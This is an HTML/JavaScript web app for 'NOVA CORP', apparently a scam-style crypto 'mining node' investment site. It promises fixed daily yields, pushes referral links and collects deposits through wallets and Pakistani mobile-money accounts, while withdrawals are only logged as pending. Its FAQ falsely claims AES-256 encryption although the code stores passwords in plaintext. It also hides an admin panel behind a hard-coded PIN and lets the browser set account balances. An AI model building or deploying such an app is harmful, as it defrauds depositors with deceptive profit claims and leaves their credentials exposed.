<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA CORP | Quantum Ecosystem</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #D4AF37; --bg: #0b0f1a; }
        body { background: var(--bg); font-family: 'Plus Jakarta Sans', sans-serif; color: white; -webkit-tap-highlight-color: transparent; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.08); border-radius: 28px; }
        .btn-gold { background: linear-gradient(135deg, #D4AF37, #B8860B); color: white; border-radius: 16px; font-weight: 800; border: none; box-shadow: 0 4px 15px rgba(212, 175, 55, 0.2); }
        .screen { display: none; padding-bottom: 120px; }
        .active-screen { display: block !important; animation: slideUp 0.4s ease-out; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(11, 15, 26, 0.95); backdrop-filter: blur(20px); border-top: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-around; padding: 18px 5px; z-index: 1000; }
        .nav-item { color: #475569; font-size: 9px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 5px; transition: 0.3s; }
        .nav-item.active { color: var(--gold); transform: translateY(-2px); }
        input, select { background: rgba(255,255,255,0.04) !important; border: 1px solid rgba(255,255,255,0.1) !important; color: white !important; border-radius: 16px !important; outline: none; }
        .node-img { width: 100%; height: 140px; object-fit: cover; border-radius: 20px; margin-bottom: 15px; }
    </style>
</head>
<body>

    <div id="auth-screen" class="flex flex-col justify-center items-center min-h-screen p-8 text-center bg-[#0b0f1a]">
        <div class="mb-8 p-4 glass inline-block"><i class="fa-solid fa-atom text-4xl text-[#D4AF37] animate-pulse"></i></div>
        <h1 class="text-5xl font-black tracking-tighter mb-2">NO<span class="text-[#D4AF37]">VA</span></h1>
        <p class="text-[9px] text-slate-500 font-bold uppercase tracking-[0.4em] mb-12">Quantum Asset Management</p>
        
        <div class="space-y-4 w-full max-w-xs">
            <input type="text" id="u-id" placeholder="Enter Username" class="w-full p-4">
            <input type="password" id="u-pw" placeholder="Security Password" class="w-full p-4">
            <div id="ref-field" class="hidden"><input type="text" id="u-ref" placeholder="Referral (Optional)" class="w-full p-4"></div>
            <button onclick="handleAuth()" class="w-full btn-gold py-4 uppercase text-xs tracking-widest mt-2">Authorize Access</button>
            <p onclick="toggleAuth()" id="auth-btn-text" class="text-[10px] text-slate-500 font-bold uppercase cursor-pointer underline mt-6">Create Corporate Account</p>
        </div>
    </div>

    <div id="app" class="hidden">
        <header class="p-5 flex justify-between items-center sticky top-0 bg-[#0b0f1a]/90 backdrop-blur-md z-[100] border-b border-white/5">
            <div>
                <h2 id="logo-main" class="font-black text-2xl tracking-tighter cursor-pointer select-none">NO<span class="text-[#D4AF37]">VA</span></h2>
                <p class="text-[8px] font-bold text-slate-500 uppercase">Worldwide Infrastructure</p>
            </div>
            <div class="text-right">
                <p id="user-display" class="text-[10px] font-black text-[#D4AF37]">@USER</p>
                <div class="flex items-center gap-1 justify-end"><div class="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></div><span class="text-[8px] font-bold text-slate-500 uppercase">Secured</span></div>
            </div>
        </header>

        <div id="page-dash" class="screen active-screen px-4 pt-6">
            <div class="glass p-8 mb-6 relative overflow-hidden bg-gradient-to-br from-slate-900 to-black">
                <p class="text-[8px] text-slate-500 font-bold uppercase tracking-widest mb-1">Portfolio Balance</p>
                <h1 id="b-main" class="text-5xl font-black tracking-tighter mb-8">$0.00</h1>
                <div class="grid grid-cols-2 gap-4 border-t border-white/10 pt-6">
                    <div><p class="text-[7px] text-slate-500 font-bold uppercase">Daily Yield</p><p id="b-daily" class="text-lg font-black text-green-400">+$0.00</p></div>
                    <div class="text-right"><p class="text-[7px] text-slate-500 font-bold uppercase">Total Profit</p><p id="b-total" class="text-lg font-black text-[#D4AF37]">$0.00</p></div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="openModal('modal-dep')" class="glass p-6 flex flex-col items-center gap-2 border-green-500/10"><i class="fa-solid fa-circle-arrow-down text-green-500 text-xl"></i><span class="text-[10px] font-black">DEPOSIT</span></button>
                <button onclick="openModal('modal-wd')" class="glass p-6 flex flex-col items-center gap-2 border-red-500/10"><i class="fa-solid fa-circle-arrow-up text-red-500 text-xl"></i><span class="text-[10px] font-black">WITHDRAW</span></button>
            </div>

            <div class="glass p-5 mb-6">
                <h3 class="text-[10px] font-black uppercase mb-4 text-slate-500">Corporate Referral Link</h3>
                <div class="flex gap-2">
                    <input type="text" id="ref-link" readonly class="flex-1 bg-white/5 border-none p-3 text-[9px] font-mono">
                    <button onclick="copyRef()" class="btn-gold px-4 text-[9px]">COPY</button>
                </div>
            </div>
        </div>

        <div id="page-nodes" class="screen px-4 pt-6">
            <h2 class="text-2xl font-black mb-6 uppercase tracking-tighter">Mining <span class="text-[#D4AF37]">Nodes</span></h2>
            <div id="nodes-grid" class="space-y-4"></div>
        </div>

        <div id="page-logs" class="screen px-4 pt-6">
            <h2 class="text-2xl font-black mb-6 uppercase tracking-tighter">Transaction <span class="text-slate-500">Logs</span></h2>
            <div id="logs-list" class="space-y-3"></div>
        </div>

        <div id="page-info" class="screen px-4 pt-6">
            <div class="glass p-6 mb-4">
                <h3 class="font-black text-[#D4AF37] mb-2 uppercase text-xs">About Nova Corp</h3>
                <p class="text-[11px] text-slate-400 leading-relaxed">Nova Corp is a leading decentralized asset management firm specializing in high-frequency quantum trading and node-based mining networks across global markets.</p>
            </div>
            <div class="glass p-5 space-y-4">
                <h3 class="text-[10px] font-black text-slate-500 uppercase">Support Hub</h3>
                <button onclick="nav('page-chat', this)" class="w-full btn-gold py-4 text-[10px] uppercase tracking-widest">Connect to Agent</button>
                <details class="text-[11px] border-t border-white/5 pt-3"><summary class="font-bold cursor-pointer">What is the withdrawal tax?</summary><p class="mt-2 text-slate-500">A fixed 5% network maintenance fee is deducted automatically from all withdrawals.</p></details>
                <details class="text-[11px]"><summary class="font-bold cursor-pointer">Is my data secure?</summary><p class="mt-2 text-slate-500">We use end-to-end AES-256 encryption for all user credentials and transaction hashes.</p></details>
            </div>
        </div>

        <div id="page-chat" class="screen px-4 pt-6">
            <div class="glass flex flex-col h-[65vh]">
                <div class="p-4 border-b border-white/5 flex justify-between items-center">
                    <span class="text-[10px] font-black uppercase text-[#D4AF37]"><i class="fa-solid fa-headset mr-2"></i>Live Support Agent</span>
                </div>
                <div id="chat-box" class="flex-1 p-4 space-y-4 overflow-y-auto text-[12px]"></div>
                <div class="p-4 border-t border-white/5 flex gap-2">
                    <input type="text" id="chat-msg" placeholder="Describe your issue..." class="flex-1 p-3 text-xs">
                    <button onclick="sendChat()" class="btn-gold px-4"><i class="fa-solid fa-paper-plane"></i></button>
                </div>
            </div>
        </div>

        <div id="page-admin" class="screen px-4 pt-6">
            <h2 class="text-2xl font-black mb-6 text-red-500 uppercase">Command Center</h2>
            <div id="adm-pending-list" class="space-y-3"></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('page-dash', this)" class="nav-item active"><i class="fa-solid fa-grid-2 text-base"></i><span>HOME</span></div>
            <div onclick="nav('page-nodes', this)" class="nav-item"><i class="fa-solid fa-microchip text-base"></i><span>NODES</span></div>
            <div onclick="nav('page-logs', this)" class="nav-item"><i class="fa-solid fa-file-invoice-dollar text-base"></i><span>RECORDS</span></div>
            <div onclick="nav('page-info', this)" class="nav-item"><i class="fa-solid fa-shield-check text-base"></i><span>INFO</span></div>
            <div id="nav-admin-btn" onclick="nav('page-admin', this)" class="nav-item text-red-500 hidden"><i class="fa-solid fa-user-gear text-base"></i><span>ADMIN</span></div>
        </nav>
    </div>

    <div id="modal-dep" class="fixed inset-0 bg-[#0b0f1a] z-[2000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8"><h2 class="font-black text-2xl tracking-tighter">DEPOSIT</h2><i onclick="closeModal('modal-dep')" class="fa-solid fa-xmark text-xl"></i></div>
        <select id="dep-method" onchange="updateDepAddr()" class="w-full p-4 mb-4">
            <option value="">Select Method</option>
            <option value="Binance Pay">Binance Pay</option>
            <option value="USDT (BEP20)">USDT (BEP20)</option>
            <option value="EasyPaisa">EasyPaisa</option>
            <option value="JazzCash">JazzCash</option>
            <option value="SadaPay">SadaPay</option>
        </select>
        <div id="addr-box" class="glass p-5 text-center mb-6 hidden font-mono text-[10px] break-all"></div>
        <input type="number" id="dep-amt" placeholder="Amount ($)" class="w-full p-4 mb-4">
        <input type="text" id="dep-ref" placeholder="Transaction ID / Screenshot Link" class="w-full p-4 mb-8">
        <button onclick="submitFinance('Deposit')" class="w-full btn-gold py-4 uppercase text-xs">Confirm Request</button>
    </div>

    <div id="modal-wd" class="fixed inset-0 bg-[#0b0f1a] z-[2000] p-8 hidden">
        <div class="flex justify-between items-center mb-8"><h2 class="font-black text-2xl tracking-tighter">WITHDRAW</h2><i onclick="closeModal('modal-wd')" class="fa-solid fa-xmark text-xl"></i></div>
        <div class="glass p-5 mb-6"><p class="text-[9px] text-slate-500 uppercase mb-2">Network Fee: 5%</p><p class="text-xs font-bold">Min Withdrawal: $10.00</p></div>
        <input type="number" id="wd-amt" placeholder="Amount ($)" class="w-full p-4 mb-4">
        <input type="text" id="wd-addr" placeholder="Wallet Address / Phone No" class="w-full p-4 mb-8">
        <button onclick="submitFinance('Withdraw')" class="w-full btn-gold py-4 uppercase text-xs">Request Payout</button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig); const db = getFirestore(app);

        let user = localStorage.getItem('nova_session');
        let mode = 'login'; let tapCount = 0;

        // SECRET ADMIN LOGIC (4 Taps)
        document.getElementById('logo-main').onclick = () => {
            tapCount++;
            if(tapCount === 4) {
                const pin = prompt("Enter Administration Key:");
                if(pin === "nov786") {
                    document.getElementById('nav-admin-btn').classList.remove('hidden');
                    alert("Admin terminal unlocked.");
                }
                tapCount = 0;
            }
        };

        // NODES DATA (21 Unique Nodes)
        const nodeData = [];
        const imgs = [
            "https://images.unsplash.com/photo-1518770660439-4636190af475?w=400",
            "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=400",
            "https://images.unsplash.com/photo-1451187580459-43490279c0fa?w=400"
        ];
        for(let i=1; i<=21; i++) {
            nodeData.push({ id: i, n: `Quantum Core V${i}`, c: 10 + (i*30), y: 0.8 + (i*1.2), img: imgs[i % 3] });
        }

        function checkSession() {
            if (user) {
                document.getElementById('auth-screen').style.display = 'none';
                document.getElementById('app').classList.remove('hidden');
                initApp(user);
            }
        }

        window.handleAuth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            if(!id || !pw) return alert("Fill credentials");
            const uRef = doc(db, "users", id); const snap = await getDoc(uRef);
            if(mode === 'login') {
                if(snap.exists() && snap.data().password === pw) { localStorage.setItem('nova_session', id); location.reload(); }
                else alert("Access Denied");
            } else {
                if(snap.exists()) return alert("Username taken");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0, total_profit: 0, nodes: [], team: 0 });
                localStorage.setItem('nova_session', id); location.reload();
            }
        };

        function initApp(id) {
            document.getElementById('user-display').innerText = `@${id}`;
            document.getElementById('ref-link').value = `${window.location.origin}${window.location.pathname}?ref=${id}`;
            
            onSnapshot(doc(db, "users", id), d => {
                const u = d.data(); if(!u) return;
                document.getElementById('b-main').innerText = `$${u.balance.toFixed(2)}`;
                document.getElementById('b-daily').innerText = `+$${u.daily.toFixed(2)}`;
                document.getElementById('b-total').innerText = `$${u.total_profit.toFixed(2)}`;
                renderNodes(u.nodes || []);
            });

            onSnapshot(query(collection(db, "logs"), where("user", "==", id), orderBy("time", "desc")), s => {
                const list = document.getElementById('logs-list'); list.innerHTML = "";
                s.forEach(d => {
                    const l = d.data();
                    list.innerHTML += `<div class="glass p-4 flex justify-between items-center">
                        <div><p class="text-[10px] font-black uppercase">${l.type}</p><p class="text-[8px] text-slate-500">${new Date(l.time).toLocaleString()}</p></div>
                        <div class="text-right"><p class="text-[10px] font-black">$${l.amount}</p><p class="text-[8px] uppercase font-bold ${l.status==='Pending'?'text-orange-500':'text-green-500'}">${l.status}</p></div>
                    </div>`;
                });
            });
        }

        function renderNodes(active) {
            const grid = document.getElementById('nodes-grid'); grid.innerHTML = "";
            nodeData.forEach(n => {
                const isOwned = active.includes(n.id);
                grid.innerHTML += `<div class="glass p-5">
                    <img src="${n.img}" class="node-img">
                    <div class="flex justify-between items-start mb-4">
                        <div><h4 class="font-black text-xs uppercase">${n.n}</h4><p class="text-[9px] text-slate-500">Yield Loop: 24h</p></div>
                        <div class="text-right"><p class="text-[10px] font-black text-[#D4AF37]">$${n.c}</p><p class="text-[8px] text-green-400">+$${n.y}/day</p></div>
                    </div>
                    <button onclick="${isOwned?'':`buyNode(${n.id},${n.c},${n.y})`}" class="w-full py-3 ${isOwned?'bg-green-500/10 text-green-500':'btn-gold'} rounded-xl text-[9px] font-black uppercase">
                        ${isOwned ? 'NODE ACTIVE' : 'DEPLOY HARDWARE'}
                    </button>
                </div>`;
            });
        }

        window.buyNode = async (id, cost, yieldVal) => {
            const uRef = doc(db, "users", user); const snap = await getDoc(uRef);
            if(snap.data().balance < cost) return alert("Insufficient Liquidity");
            await updateDoc(uRef, { 
                balance: snap.data().balance - cost, 
                nodes: [...(snap.data().nodes || []), id],
                daily: (snap.data().daily || 0) + yieldVal
            });
            alert("Node deployed successfully!");
        };

        window.updateDepAddr = () => {
            const m = document.getElementById('dep-method').value;
            const box = document.getElementById('addr-box');
            const addrs = { 'Binance Pay': 'ID: 8827731', 'EasyPaisa': '0300-1234567', 'USDT (BEP20)': '0x71...abc' };
            if(m) { box.innerText = addrs[m] || 'Contact Admin'; box.classList.remove('hidden'); }
            else box.classList.add('hidden');
        };

        window.submitFinance = async (type) => {
            const amt = parseFloat(document.getElementById(type==='Deposit'?'dep-amt':'wd-amt').value);
            const ref = document.getElementById(type==='Deposit'?'dep-ref':'wd-addr').value;
            if(!amt || !ref) return alert("Complete all fields");
            await addDoc(collection(db, "logs"), { user, type, amount: amt, ref, status: 'Pending', time: Date.now() });
            alert("Request submitted."); closeModal(type==='Deposit'?'modal-dep':'modal-wd');
        };

        window.nav = (id, el) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            el.classList.add('active');
        };

        window.toggleAuth = () => { mode = mode === 'login' ? 'reg' : 'login'; document.getElementById('auth-btn-text').innerText = mode === 'login' ? "Create Corporate Account" : "Back to Login"; document.getElementById('ref-field').classList.toggle('hidden'); };
        window.openModal = (id) => document.getElementById(id).classList.remove('hidden');
        window.closeModal = (id) => document.getElementById(id).classList.add('hidden');
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.copyRef = () => { navigator.clipboard.writeText(document.getElementById('ref-link').value); alert("Link Copied!"); };

        checkSession();
    </script>
</body>
</html>
